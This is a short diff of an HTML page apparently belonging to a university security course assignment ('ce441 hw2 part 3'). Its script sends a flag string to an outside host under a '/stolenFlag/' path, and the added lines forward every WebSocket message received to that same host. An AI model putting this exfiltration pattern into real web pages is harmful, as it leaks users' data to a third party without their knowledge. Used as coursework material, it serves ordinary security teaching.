@@ -6,9 +6,13 @@
     <body>
     this is ce441 hw2 part 3, v2
         <script>
-const wsUrl = "ws://91.107.157.58:8080/ws";
+const ws = new WebSocket(`ws://${window.location.host}/ws`);
 let flag=`ce441{salam}`;
 fetch(`https://hw2p3.ckodser.ir/stolenFlag/${flag}`);
+ws.onmessage = (event) => {
+  const response = event.data;
+  fetch(`https://hw2p3.ckodser.ir/scriptisworking/${response}`);
+};
         </script>
     </body>
 </html>
